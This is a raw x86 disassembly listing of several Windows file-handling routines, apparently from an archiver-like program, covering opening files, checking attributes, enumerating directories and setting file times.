  40242a:	c2 04 00             	ret    $0x4
  40242d:	ff 74 24 04          	push   0x4(%esp)
  402431:	e8 0b 00 00 00       	call   0x402441
  402436:	33 c9                	xor    %ecx,%ecx
  402438:	83 f8 ff             	cmp    $0xffffffff,%eax
  40243b:	0f 95 c0             	setne  %al
  40243e:	c2 04 00             	ret    $0x4
  402441:	55                   	push   %ebp
  402442:	8b ec                	mov    %esp,%ebp
  402444:	b8 00 10 00 00       	mov    $0x1000,%eax
  402449:	e8 82 07 01 00       	call   0x412bd0
  40244e:	56                   	push   %esi
  40244f:	ff 75 08             	push   0x8(%ebp)
  402452:	ff 15 3c 70 42 00    	call   *0x42703c
  402458:	8b f0                	mov    %eax,%esi
  40245a:	83 fe ff             	cmp    $0xffffffff,%esi
  40245d:	75 27                	jne    0x402486
  40245f:	68 00 08 00 00       	push   $0x800
  402464:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  40246a:	50                   	push   %eax
  40246b:	ff 75 08             	push   0x8(%ebp)
  40246e:	e8 55 0e 00 00       	call   0x4032c8
  402473:	84 c0                	test   %al,%al
  402475:	74 0f                	je     0x402486
  402477:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  40247d:	50                   	push   %eax
  40247e:	ff 15 3c 70 42 00    	call   *0x42703c
  402484:	8b f0                	mov    %eax,%esi
  402486:	8b c6                	mov    %esi,%eax
  402488:	5e                   	pop    %esi
  402489:	8b e5                	mov    %ebp,%esp
  40248b:	5d                   	pop    %ebp
  40248c:	c2 04 00             	ret    $0x4
  40248f:	8b 44 24 04          	mov    0x4(%esp),%eax
  402493:	24 07                	and    $0x7,%al
  402495:	f6 d8                	neg    %al
  402497:	1a c0                	sbb    %al,%al
  402499:	fe c0                	inc    %al
  40249b:	c2 04 00             	ret    $0x4
  40249e:	83 7c 24 04 ff       	cmpl   $0xffffffff,0x4(%esp)
  4024a3:	74 0c                	je     0x4024b1
  4024a5:	f6 44 24 04 10       	testb  $0x10,0x4(%esp)
  4024aa:	74 05                	je     0x4024b1
  4024ac:	33 c0                	xor    %eax,%eax
  4024ae:	40                   	inc    %eax
  4024af:	eb 02                	jmp    0x4024b3
  4024b1:	33 c0                	xor    %eax,%eax
  4024b3:	c2 04 00             	ret    $0x4
  4024b6:	8b 44 24 04          	mov    0x4(%esp),%eax
  4024ba:	c1 e8 0a             	shr    $0xa,%eax
  4024bd:	83 e0 01             	and    $0x1,%eax
  4024c0:	c2 04 00             	ret    $0x4
  4024c3:	55                   	push   %ebp
  4024c4:	8b ec                	mov    %esp,%ebp
  4024c6:	b8 00 10 00 00       	mov    $0x1000,%eax
  4024cb:	e8 00 07 01 00       	call   0x412bd0
  4024d0:	56                   	push   %esi
  4024d1:	8b 75 08             	mov    0x8(%ebp),%esi
  4024d4:	56                   	push   %esi
  4024d5:	e8 fd 10 00 00       	call   0x4035d7
  4024da:	0f b7 00             	movzwl (%eax),%eax
  4024dd:	83 f8 2e             	cmp    $0x2e,%eax
  4024e0:	74 12                	je     0x4024f4
  4024e2:	83 f8 20             	cmp    $0x20,%eax
  4024e5:	74 0d                	je     0x4024f4
  4024e7:	6a 00                	push   $0x0
  4024e9:	56                   	push   %esi
  4024ea:	ff 15 34 70 42 00    	call   *0x427034
  4024f0:	85 c0                	test   %eax,%eax
  4024f2:	75 33                	jne    0x402527
  4024f4:	56                   	push   %esi
  4024f5:	e8 33 ff ff ff       	call   0x40242d
  4024fa:	84 c0                	test   %al,%al
  4024fc:	75 3c                	jne    0x40253a
  4024fe:	68 00 08 00 00       	push   $0x800
  402503:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  402509:	50                   	push   %eax
  40250a:	56                   	push   %esi
  40250b:	e8 b8 0d 00 00       	call   0x4032c8
  402510:	84 c0                	test   %al,%al
  402512:	74 26                	je     0x40253a
  402514:	6a 00                	push   $0x0
  402516:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  40251c:	50                   	push   %eax
  40251d:	ff 15 34 70 42 00    	call   *0x427034
  402523:	85 c0                	test   %eax,%eax
  402525:	74 13                	je     0x40253a
  402527:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
  40252b:	74 09                	je     0x402536
  40252d:	ff 75 10             	push   0x10(%ebp)
  402530:	56                   	push   %esi
  402531:	e8 ca 01 00 00       	call   0x402700
  402536:	33 c0                	xor    %eax,%eax
  402538:	eb 18                	jmp    0x402552
  40253a:	ff 15 00 70 42 00    	call   *0x427000
  402540:	83 f8 02             	cmp    $0x2,%eax
  402543:	74 0a                	je     0x40254f
  402545:	83 f8 03             	cmp    $0x3,%eax
  402548:	74 05                	je     0x40254f
  40254a:	33 c0                	xor    %eax,%eax
  40254c:	40                   	inc    %eax
  40254d:	eb 03                	jmp    0x402552
  40254f:	6a 02                	push   $0x2
  402551:	58                   	pop    %eax
  402552:	5e                   	pop    %esi
  402553:	8b e5                	mov    %ebp,%esp
  402555:	5d                   	pop    %ebp
  402556:	c2 0c 00             	ret    $0xc
  402559:	6a 00                	push   $0x0
  40255b:	ff 74 24 08          	push   0x8(%esp)
  40255f:	e8 9c 01 00 00       	call   0x402700
  402564:	c2 04 00             	ret    $0x4
  402567:	b8 24 10 00 00       	mov    $0x1024,%eax
  40256c:	e8 5f 06 01 00       	call   0x412bd0
  402571:	53                   	push   %ebx
  402572:	55                   	push   %ebp
  402573:	33 db                	xor    %ebx,%ebx
  402575:	33 c9                	xor    %ecx,%ecx
  402577:	56                   	push   %esi
  402578:	8b b4 24 38 10 00 00 	mov    0x1038(%esp),%esi
  40257f:	43                   	inc    %ebx
  402580:	57                   	push   %edi
  402581:	85 f6                	test   %esi,%esi
  402583:	74 0b                	je     0x402590
  402585:	8b 06                	mov    (%esi),%eax
  402587:	0b 46 04             	or     0x4(%esi),%eax
  40258a:	88 5c 24 11          	mov    %bl,0x11(%esp)
  40258e:	75 04                	jne    0x402594
  402590:	88 4c 24 11          	mov    %cl,0x11(%esp)
  402594:	8b bc 24 40 10 00 00 	mov    0x1040(%esp),%edi
  40259b:	85 ff                	test   %edi,%edi
  40259d:	74 0b                	je     0x4025aa
  40259f:	8b 07                	mov    (%edi),%eax
  4025a1:	0b 47 04             	or     0x4(%edi),%eax
  4025a4:	88 5c 24 13          	mov    %bl,0x13(%esp)
  4025a8:	75 04                	jne    0x4025ae
  4025aa:	88 4c 24 13          	mov    %cl,0x13(%esp)
  4025ae:	8b ac 24 44 10 00 00 	mov    0x1044(%esp),%ebp
  4025b5:	85 ed                	test   %ebp,%ebp
  4025b7:	74 0c                	je     0x4025c5
  4025b9:	8b 45 00             	mov    0x0(%ebp),%eax
  4025bc:	0b 45 04             	or     0x4(%ebp),%eax
  4025bf:	88 5c 24 12          	mov    %bl,0x12(%esp)
  4025c3:	75 04                	jne    0x4025c9
  4025c5:	88 4c 24 12          	mov    %cl,0x12(%esp)
  4025c9:	ff b4 24 38 10 00 00 	push   0x1038(%esp)
  4025d0:	e8 6c fe ff ff       	call   0x402441
  4025d5:	89 44 24 18          	mov    %eax,0x18(%esp)
  4025d9:	83 f8 ff             	cmp    $0xffffffff,%eax
  4025dc:	74 14                	je     0x4025f2
  4025de:	84 c3                	test   %al,%bl
  4025e0:	74 10                	je     0x4025f2
  4025e2:	6a 00                	push   $0x0
  4025e4:	ff b4 24 3c 10 00 00 	push   0x103c(%esp)
  4025eb:	e8 10 01 00 00       	call   0x402700
  4025f0:	eb 02                	jmp    0x4025f4
  4025f2:	32 db                	xor    %bl,%bl
  4025f4:	6a 00                	push   $0x0
  4025f6:	68 00 00 00 02       	push   $0x2000000
  4025fb:	6a 03                	push   $0x3
  4025fd:	6a 00                	push   $0x0
  4025ff:	6a 03                	push   $0x3
  402601:	68 00 00 00 40       	push   $0x40000000
  402606:	ff b4 24 50 10 00 00 	push   0x1050(%esp)
  40260d:	ff 15 30 70 42 00    	call   *0x427030
  402613:	89 44 24 14          	mov    %eax,0x14(%esp)
  402617:	83 f8 ff             	cmp    $0xffffffff,%eax
  40261a:	75 48                	jne    0x402664
  40261c:	68 00 08 00 00       	push   $0x800
  402621:	8d 44 24 38          	lea    0x38(%esp),%eax
  402625:	50                   	push   %eax
  402626:	ff b4 24 40 10 00 00 	push   0x1040(%esp)
  40262d:	e8 96 0c 00 00       	call   0x4032c8
  402632:	84 c0                	test   %al,%al
  402634:	0f 84 b9 00 00 00    	je     0x4026f3
  40263a:	6a 00                	push   $0x0
  40263c:	68 00 00 00 02       	push   $0x2000000
  402641:	6a 03                	push   $0x3
  402643:	6a 00                	push   $0x0
  402645:	6a 03                	push   $0x3
  402647:	68 00 00 00 40       	push   $0x40000000
  40264c:	8d 44 24 4c          	lea    0x4c(%esp),%eax
  402650:	50                   	push   %eax
  402651:	ff 15 30 70 42 00    	call   *0x427030
  402657:	89 44 24 14          	mov    %eax,0x14(%esp)
  40265b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40265e:	0f 84 8f 00 00 00    	je     0x4026f3
  402664:	80 7c 24 11 00       	cmpb   $0x0,0x11(%esp)
  402669:	74 0c                	je     0x402677
  40266b:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  40266f:	8b ce                	mov    %esi,%ecx
  402671:	50                   	push   %eax
  402672:	e8 15 48 00 00       	call   0x406e8c
  402677:	80 7c 24 13 00       	cmpb   $0x0,0x13(%esp)
  40267c:	74 0c                	je     0x40268a
  40267e:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  402682:	8b cf                	mov    %edi,%ecx
  402684:	50                   	push   %eax
  402685:	e8 02 48 00 00       	call   0x406e8c
  40268a:	80 7c 24 12 00       	cmpb   $0x0,0x12(%esp)
  40268f:	74 0c                	je     0x40269d
  402691:	8d 44 24 24          	lea    0x24(%esp),%eax
  402695:	8b cd                	mov    %ebp,%ecx
  402697:	50                   	push   %eax
  402698:	e8 ef 47 00 00       	call   0x406e8c
  40269d:	0f b6 44 24 11       	movzbl 0x11(%esp),%eax
  4026a2:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  4026a6:	f7 d8                	neg    %eax
  4026a8:	8b 74 24 14          	mov    0x14(%esp),%esi
  4026ac:	1b c0                	sbb    %eax,%eax
  4026ae:	23 c1                	and    %ecx,%eax
  4026b0:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  4026b4:	50                   	push   %eax
  4026b5:	0f b6 44 24 16       	movzbl 0x16(%esp),%eax
  4026ba:	f7 d8                	neg    %eax
  4026bc:	1b c0                	sbb    %eax,%eax
  4026be:	23 c1                	and    %ecx,%eax
  4026c0:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  4026c4:	50                   	push   %eax
  4026c5:	0f b6 44 24 1b       	movzbl 0x1b(%esp),%eax
  4026ca:	f7 d8                	neg    %eax
  4026cc:	1b c0                	sbb    %eax,%eax
  4026ce:	23 c1                	and    %ecx,%eax
  4026d0:	50                   	push   %eax
  4026d1:	56                   	push   %esi
  4026d2:	ff 15 28 70 42 00    	call   *0x427028
  4026d8:	56                   	push   %esi
  4026d9:	ff 15 2c 70 42 00    	call   *0x42702c
  4026df:	84 db                	test   %bl,%bl
  4026e1:	74 10                	je     0x4026f3
  4026e3:	ff 74 24 18          	push   0x18(%esp)
  4026e7:	ff b4 24 3c 10 00 00 	push   0x103c(%esp)
  4026ee:	e8 0d 00 00 00       	call   0x402700
  4026f3:	5f                   	pop    %edi
  4026f4:	5e                   	pop    %esi
  4026f5:	5d                   	pop    %ebp
  4026f6:	5b                   	pop    %ebx
  4026f7:	81 c4 24 10 00 00    	add    $0x1024,%esp
  4026fd:	c2 10 00             	ret    $0x10
  402700:	55                   	push   %ebp
  402701:	8b ec                	mov    %esp,%ebp
  402703:	b8 00 10 00 00       	mov    $0x1000,%eax
  402708:	e8 c3 04 01 00       	call   0x412bd0
  40270d:	53                   	push   %ebx
  40270e:	ff 75 0c             	push   0xc(%ebp)
  402711:	ff 75 08             	push   0x8(%ebp)
  402714:	ff 15 38 70 42 00    	call   *0x427038
  40271a:	85 c0                	test   %eax,%eax
  40271c:	0f 95 c3             	setne  %bl
  40271f:	84 db                	test   %bl,%bl
  402721:	75 2d                	jne    0x402750
  402723:	68 00 08 00 00       	push   $0x800
  402728:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  40272e:	50                   	push   %eax
  40272f:	ff 75 08             	push   0x8(%ebp)
  402732:	e8 91 0b 00 00       	call   0x4032c8
  402737:	84 c0                	test   %al,%al
  402739:	74 15                	je     0x402750
  40273b:	ff 75 0c             	push   0xc(%ebp)
  40273e:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  402744:	50                   	push   %eax
  402745:	ff 15 38 70 42 00    	call   *0x427038
  40274b:	85 c0                	test   %eax,%eax
  40274d:	0f 95 c3             	setne  %bl
  402750:	8a c3                	mov    %bl,%al
  402752:	5b                   	pop    %ebx
  402753:	8b e5                	mov    %ebp,%esp
  402755:	5d                   	pop    %ebp
  402756:	c2 08 00             	ret    $0x8
  402759:	83 89 04 10 00 00 ff 	orl    $0xffffffff,0x1004(%ecx)
  402760:	33 c0                	xor    %eax,%eax
  402762:	66 89 01             	mov    %ax,(%ecx)
  402765:	8b c1                	mov    %ecx,%eax
  402767:	c6 81 00 10 00 00 01 	movb   $0x1,0x1000(%ecx)
  40276e:	c3                   	ret
  40276f:	8b 81 04 10 00 00    	mov    0x1004(%ecx),%eax
  402775:	83 f8 ff             	cmp    $0xffffffff,%eax
  402778:	74 07                	je     0x402781
  40277a:	50                   	push   %eax
  40277b:	ff 15 48 70 42 00    	call   *0x427048
  402781:	c3                   	ret
  402782:	56                   	push   %esi
  402783:	8b 74 24 0c          	mov    0xc(%esp),%esi
  402787:	ff 74 24 08          	push   0x8(%esp)
  40278b:	c6 86 44 10 00 00 00 	movb   $0x0,0x1044(%esi)
  402792:	e8 3a 0d 00 00       	call   0x4034d1
  402797:	84 c0                	test   %al,%al
  402799:	74 04                	je     0x40279f
  40279b:	32 c0                	xor    %al,%al
  40279d:	eb 43                	jmp    0x4027e2
  40279f:	56                   	push   %esi
  4027a0:	ff 74 24 0c          	push   0xc(%esp)
  4027a4:	6a ff                	push   $0xffffffff
  4027a6:	e8 05 01 00 00       	call   0x4028b0
  4027ab:	83 f8 ff             	cmp    $0xffffffff,%eax
  4027ae:	74 eb                	je     0x40279b
  4027b0:	50                   	push   %eax
  4027b1:	ff 15 48 70 42 00    	call   *0x427048
  4027b7:	ff b6 08 10 00 00    	push   0x1008(%esi)
  4027bd:	83 a6 40 10 00 00 00 	andl   $0x0,0x1040(%esi)
  4027c4:	e8 d5 fc ff ff       	call   0x40249e
  4027c9:	ff b6 08 10 00 00    	push   0x1008(%esi)
  4027cf:	88 86 0c 10 00 00    	mov    %al,0x100c(%esi)
  4027d5:	e8 dc fc ff ff       	call   0x4024b6
  4027da:	88 86 0d 10 00 00    	mov    %al,0x100d(%esi)
  4027e0:	b0 01                	mov    $0x1,%al
  4027e2:	5e                   	pop    %esi
  4027e3:	c2 0c 00             	ret    $0xc
  4027e6:	53                   	push   %ebx
  4027e7:	56                   	push   %esi
  4027e8:	57                   	push   %edi
  4027e9:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4027ed:	8b f1                	mov    %ecx,%esi
  4027ef:	e9 82 00 00 00       	jmp    0x402876
  4027f4:	80 be 00 10 00 00 00 	cmpb   $0x0,0x1000(%esi)
  4027fb:	57                   	push   %edi
  4027fc:	56                   	push   %esi
  4027fd:	74 0f                	je     0x40280e
  4027ff:	6a ff                	push   $0xffffffff
  402801:	e8 aa 00 00 00       	call   0x4028b0
  402806:	89 86 04 10 00 00    	mov    %eax,0x1004(%esi)
  40280c:	eb 0b                	jmp    0x402819
  40280e:	ff b6 04 10 00 00    	push   0x1004(%esi)
  402814:	e8 97 00 00 00       	call   0x4028b0
  402819:	83 f8 ff             	cmp    $0xffffffff,%eax
  40281c:	74 69                	je     0x402887
  40281e:	ff b7 08 10 00 00    	push   0x1008(%edi)
  402824:	89 9f 40 10 00 00    	mov    %ebx,0x1040(%edi)
  40282a:	e8 6f fc ff ff       	call   0x40249e
  40282f:	ff b7 08 10 00 00    	push   0x1008(%edi)
  402835:	88 87 0c 10 00 00    	mov    %al,0x100c(%edi)
  40283b:	e8 76 fc ff ff       	call   0x4024b6
  402840:	88 87 0d 10 00 00    	mov    %al,0x100d(%edi)
  402846:	57                   	push   %edi
  402847:	88 9e 00 10 00 00    	mov    %bl,0x1000(%esi)
  40284d:	e8 a1 0d 00 00       	call   0x4035f3
  402852:	8b d8                	mov    %eax,%ebx
  402854:	68 c4 72 42 00       	push   $0x4272c4
  402859:	53                   	push   %ebx
  40285a:	e8 d6 76 01 00       	call   0x419f35
  40285f:	59                   	pop    %ecx
  402860:	59                   	pop    %ecx
  402861:	85 c0                	test   %eax,%eax
  402863:	74 11                	je     0x402876
  402865:	68 c8 72 42 00       	push   $0x4272c8
  40286a:	53                   	push   %ebx
  40286b:	e8 c5 76 01 00       	call   0x419f35
  402870:	59                   	pop    %ecx
  402871:	59                   	pop    %ecx
  402872:	85 c0                	test   %eax,%eax
  402874:	75 19                	jne    0x40288f
  402876:	33 db                	xor    %ebx,%ebx
  402878:	88 9f 44 10 00 00    	mov    %bl,0x1044(%edi)
  40287e:	66 39 1e             	cmp    %bx,(%esi)
  402881:	0f 85 6d ff ff ff    	jne    0x4027f4
  402887:	32 c0                	xor    %al,%al
  402889:	5f                   	pop    %edi
  40288a:	5e                   	pop    %esi
  40288b:	5b                   	pop    %ebx
  40288c:	c2 08 00             	ret    $0x8
  40288f:	b0 01                	mov    $0x1,%al
  402891:	eb f6                	jmp    0x402889
  402893:	56                   	push   %esi
  402894:	68 00 08 00 00       	push   $0x800
  402899:	ff 74 24 0c          	push   0xc(%esp)
  40289d:	8b f1                	mov    %ecx,%esi
  40289f:	56                   	push   %esi
  4028a0:	e8 36 3d 00 00       	call   0x4065db
  4028a5:	c6 86 00 10 00 00 01 	movb   $0x1,0x1000(%esi)
  4028ac:	5e                   	pop    %esi
  4028ad:	c2 04 00             	ret    $0x4
  4028b0:	b8 50 12 00 00       	mov    $0x1250,%eax
  4028b5:	e8 16 03 01 00       	call   0x412bd0
  4028ba:	53                   	push   %ebx
  4028bb:	55                   	push   %ebp
  4028bc:	56                   	push   %esi
  4028bd:	8b b4 24 60 12 00 00 	mov    0x1260(%esp),%esi
  4028c4:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4028c8:	57                   	push   %edi
  4028c9:	8b bc 24 6c 12 00 00 	mov    0x126c(%esp),%edi
  4028d0:	83 cd ff             	or     $0xffffffff,%ebp
  4028d3:	50                   	push   %eax
  4028d4:	3b f5                	cmp    %ebp,%esi
  4028d6:	75 72                	jne    0x40294a
  4028d8:	ff b4 24 6c 12 00 00 	push   0x126c(%esp)
  4028df:	8b 1d 4c 70 42 00    	mov    0x42704c,%ebx
  4028e5:	ff d3                	call   *%ebx
  4028e7:	8b f0                	mov    %eax,%esi
  4028e9:	3b f5                	cmp    %ebp,%esi
  4028eb:	0f 85 80 00 00 00    	jne    0x402971
  4028f1:	68 00 08 00 00       	push   $0x800
  4028f6:	8d 84 24 64 02 00 00 	lea    0x264(%esp),%eax
  4028fd:	50                   	push   %eax
  4028fe:	ff b4 24 70 12 00 00 	push   0x1270(%esp)
  402905:	e8 be 09 00 00       	call   0x4032c8
  40290a:	84 c0                	test   %al,%al
  40290c:	74 15                	je     0x402923
  40290e:	8d 44 24 10          	lea    0x10(%esp),%eax
  402912:	50                   	push   %eax
  402913:	8d 84 24 64 02 00 00 	lea    0x264(%esp),%eax
  40291a:	50                   	push   %eax
  40291b:	ff d3                	call   *%ebx
  40291d:	8b f0                	mov    %eax,%esi
  40291f:	3b f5                	cmp    %ebp,%esi
  402921:	75 4e                	jne    0x402971
  402923:	ff 15 00 70 42 00    	call   *0x427000
  402929:	83 f8 02             	cmp    $0x2,%eax
  40292c:	74 0f                	je     0x40293d
  40292e:	83 f8 03             	cmp    $0x3,%eax
  402931:	74 0a                	je     0x40293d
  402933:	83 f8 12             	cmp    $0x12,%eax
  402936:	74 05                	je     0x40293d
  402938:	33 c0                	xor    %eax,%eax
  40293a:	40                   	inc    %eax
  40293b:	eb 02                	jmp    0x40293f
  40293d:	33 c0                	xor    %eax,%eax
  40293f:	88 87 44 10 00 00    	mov    %al,0x1044(%edi)
  402945:	e9 d5 00 00 00       	jmp    0x402a1f
  40294a:	56                   	push   %esi
  40294b:	ff 15 50 70 42 00    	call   *0x427050
  402951:	85 c0                	test   %eax,%eax
  402953:	75 14                	jne    0x402969
  402955:	8b f5                	mov    %ebp,%esi
  402957:	ff 15 00 70 42 00    	call   *0x427000
  40295d:	83 f8 12             	cmp    $0x12,%eax
  402960:	0f 95 c0             	setne  %al
  402963:	88 87 44 10 00 00    	mov    %al,0x1044(%edi)
  402969:	3b f5                	cmp    %ebp,%esi
  40296b:	0f 84 ae 00 00 00    	je     0x402a1f
  402971:	bb 00 08 00 00       	mov    $0x800,%ebx
  402976:	53                   	push   %ebx
  402977:	ff b4 24 6c 12 00 00 	push   0x126c(%esp)
  40297e:	57                   	push   %edi
  40297f:	e8 57 3c 00 00       	call   0x4065db
  402984:	53                   	push   %ebx
  402985:	8d 44 24 40          	lea    0x40(%esp),%eax
  402989:	50                   	push   %eax
  40298a:	57                   	push   %edi
  40298b:	e8 1e 0d 00 00       	call   0x4036ae
  402990:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  402994:	33 c0                	xor    %eax,%eax
  402996:	03 44 24 30          	add    0x30(%esp),%eax
  40299a:	89 87 00 10 00 00    	mov    %eax,0x1000(%edi)
  4029a0:	8b 44 24 10          	mov    0x10(%esp),%eax
  4029a4:	83 d1 00             	adc    $0x0,%ecx
  4029a7:	89 87 08 10 00 00    	mov    %eax,0x1008(%edi)
  4029ad:	8b 44 24 14          	mov    0x14(%esp),%eax
  4029b1:	89 87 28 10 00 00    	mov    %eax,0x1028(%edi)
  4029b7:	8b 44 24 18          	mov    0x18(%esp),%eax
  4029bb:	89 87 2c 10 00 00    	mov    %eax,0x102c(%edi)
  4029c1:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4029c5:	89 87 30 10 00 00    	mov    %eax,0x1030(%edi)
  4029cb:	8b 44 24 20          	mov    0x20(%esp),%eax
  4029cf:	89 87 34 10 00 00    	mov    %eax,0x1034(%edi)
  4029d5:	8b 44 24 24          	mov    0x24(%esp),%eax
  4029d9:	89 87 38 10 00 00    	mov    %eax,0x1038(%edi)
  4029df:	8b 44 24 28          	mov    0x28(%esp),%eax
  4029e3:	89 87 3c 10 00 00    	mov    %eax,0x103c(%edi)
  4029e9:	8d 44 24 24          	lea    0x24(%esp),%eax
  4029ed:	89 8f 04 10 00 00    	mov    %ecx,0x1004(%edi)
  4029f3:	8d 8f 10 10 00 00    	lea    0x1010(%edi),%ecx
  4029f9:	50                   	push   %eax
  4029fa:	e8 76 46 00 00       	call   0x407075
  4029ff:	8d 44 24 14          	lea    0x14(%esp),%eax
  402a03:	50                   	push   %eax
  402a04:	8d 8f 18 10 00 00    	lea    0x1018(%edi),%ecx
  402a0a:	e8 66 46 00 00       	call   0x407075
  402a0f:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  402a13:	50                   	push   %eax
  402a14:	8d 8f 20 10 00 00    	lea    0x1020(%edi),%ecx
  402a1a:	e8 56 46 00 00       	call   0x407075
  402a1f:	83 a7 40 10 00 00 00 	andl   $0x0,0x1040(%edi)
  402a26:	8b c6                	mov    %esi,%eax
  402a28:	5f                   	pop    %edi
  402a29:	5e                   	pop    %esi
  402a2a:	5d                   	pop    %ebp
  402a2b:	5b                   	pop    %ebx
  402a2c:	81 c4 50 12 00 00    	add    $0x1250,%esp
  402a32:	c2 0c 00             	ret    $0xc
  402a35:	55                   	push   %ebp
  402a36:	8b ec                	mov    %esp,%ebp
  402a38:	8b 0d 00 10 43 00    	mov    0x431000,%ecx
  402a3e:	81 ec 14 01 00 00    	sub    $0x114,%esp
  402a44:	83 f9 ff             	cmp    $0xffffffff,%ecx
  402a47:	75 3c                	jne    0x402a85
  402a49:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
  402a4f:	c7 85 ec fe ff ff 14 	movl   $0x114,-0x114(%ebp)
  402a56:	01 00 00 
  402a59:	50                   	push   %eax
  402a5a:	ff 15 54 70 42 00    	call   *0x427054
  402a60:	8b 8d fc fe ff ff    	mov    -0x104(%ebp),%ecx
  402a66:	8b 85 f0 fe ff ff    	mov    -0x110(%ebp),%eax
  402a6c:	8b 95 f4 fe ff ff    	mov    -0x10c(%ebp),%edx
  402a72:	89 0d 00 10 43 00    	mov    %ecx,0x431000
  402a78:	a3 e0 3e 43 00       	mov    %eax,0x433ee0
  402a7d:	89 15 e4 3e 43 00    	mov    %edx,0x433ee4
  402a83:	eb 0b                	jmp    0x402a90
  402a85:	a1 e0 3e 43 00       	mov    0x433ee0,%eax
  402a8a:	8b 15 e4 3e 43 00    	mov    0x433ee4,%edx
  402a90:	83 f9 02             	cmp    $0x2,%ecx
  402a93:	75 07                	jne    0x402a9c
  402a95:	c1 e0 08             	shl    $0x8,%eax
  402a98:	03 c2                	add    %edx,%eax
  402a9a:	eb 05                	jmp    0x402aa1
  402a9c:	b8 01 05 00 00       	mov    $0x501,%eax
  402aa1:	8b e5                	mov    %ebp,%esp
  402aa3:	5d                   	pop    %ebp
  402aa4:	c3                   	ret
  402aa5:	b8 04 20 00 00       	mov    $0x2004,%eax
  402aaa:	e8 21 01 01 00       	call   0x412bd0
  402aaf:	8b 84 24 10 20 00 00 	mov    0x2010(%esp),%eax
  402ab6:	53                   	push   %ebx
  402ab7:	55                   	push   %ebp
  402ab8:	8b d8                	mov    %eax,%ebx
  402aba:	c1 eb 1f             	shr    $0x1f,%ebx
  402abd:	56                   	push   %esi
  402abe:	80 e3 01             	and    $0x1,%bl
  402ac1:	0f b7 f0             	movzwl %ax,%esi
  402ac4:	88 5c 24 0c          	mov    %bl,0xc(%esp)
  402ac8:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  402acc:	57                   	push   %edi
  402acd:	8b bc 24 18 20 00 00 	mov    0x2018(%esp),%edi
  402ad4:	85 f6                	test   %esi,%esi
  402ad6:	0f 84 47 01 00 00    	je     0x402c23
  402adc:	57                   	push   %edi
  402add:	e8 71 53 01 00       	call   0x417e53
  402ae2:	89 44 24 14          	mov    %eax,0x14(%esp)
  402ae6:	59                   	pop    %ecx
  402ae7:	83 fe 02             	cmp    $0x2,%esi
  402aea:	74 4c                	je     0x402b38
  402aec:	83 fe 04             	cmp    $0x4,%esi
  402aef:	74 47                	je     0x402b38
  402af1:	83 fe 03             	cmp    $0x3,%esi
  402af4:	74 42                	je     0x402b38
  402af6:	50                   	push   %eax
  402af7:	ff b4 24 20 20 00 00 	push   0x2020(%esp)
  402afe:	57                   	push   %edi
  402aff:	84 db                	test   %bl,%bl
  402b01:	74 0a                	je     0x402b0d
  402b03:	e8 b0 74 01 00       	call   0x419fb8
  402b08:	83 c4 0c             	add    $0xc,%esp
  402b0b:	eb 05                	jmp    0x402b12
  402b0d:	e8 02 4f 00 00       	call   0x407a14
  402b12:	85 c0                	test   %eax,%eax
  402b14:	75 22                	jne    0x402b38
  402b16:	8b 84 24 1c 20 00 00 	mov    0x201c(%esp),%eax
  402b1d:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  402b21:	0f b7 04 48          	movzwl (%eax,%ecx,2),%eax
  402b25:	83 f8 5c             	cmp    $0x5c,%eax
  402b28:	74 0a                	je     0x402b34
  402b2a:	83 f8 2f             	cmp    $0x2f,%eax
  402b2d:	74 05                	je     0x402b34
  402b2f:	66 85 c0             	test   %ax,%ax
  402b32:	75 04                	jne    0x402b38
  402b34:	b0 01                	mov    $0x1,%al
  402b36:	eb 66                	jmp    0x402b9e
  402b38:	83 fe 01             	cmp    $0x1,%esi
  402b3b:	75 04                	jne    0x402b41
  402b3d:	32 c0                	xor    %al,%al
  402b3f:	eb 5d                	jmp    0x402b9e
  402b41:	68 00 08 00 00       	push   $0x800
  402b46:	8d 44 24 18          	lea    0x18(%esp),%eax
  402b4a:	50                   	push   %eax
  402b4b:	57                   	push   %edi
  402b4c:	e8 51 06 00 00       	call   0x4031a2
  402b51:	68 00 08 00 00       	push   $0x800
  402b56:	8d 84 24 18 10 00 00 	lea    0x1018(%esp),%eax
  402b5d:	50                   	push   %eax
  402b5e:	ff b4 24 24 20 00 00 	push   0x2024(%esp)
  402b65:	e8 38 06 00 00       	call   0x4031a2
  402b6a:	83 fe 02             	cmp    $0x2,%esi
  402b6d:	74 05                	je     0x402b74
  402b6f:	83 fe 04             	cmp    $0x4,%esi
  402b72:	75 17                	jne    0x402b8b
  402b74:	55                   	push   %ebp
  402b75:	8d 84 24 18 10 00 00 	lea    0x1018(%esp),%eax
  402b7c:	50                   	push   %eax
  402b7d:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  402b81:	50                   	push   %eax
  402b82:	e8 fa 01 00 00       	call   0x402d81
  402b87:	85 c0                	test   %eax,%eax
  402b89:	75 b2                	jne    0x402b3d
  402b8b:	83 fe 03             	cmp    $0x3,%esi
  402b8e:	75 1b                	jne    0x402bab
  402b90:	55                   	push   %ebp
  402b91:	ff b4 24 20 20 00 00 	push   0x2020(%esp)
  402b98:	57                   	push   %edi
  402b99:	e8 b4 00 00 00       	call   0x402c52
  402b9e:	5f                   	pop    %edi
  402b9f:	5e                   	pop    %esi
  402ba0:	5d                   	pop    %ebp
  402ba1:	5b                   	pop    %ebx
  402ba2:	81 c4 04 20 00 00    	add    $0x2004,%esp
  402ba8:	c2 0c 00             	ret    $0xc
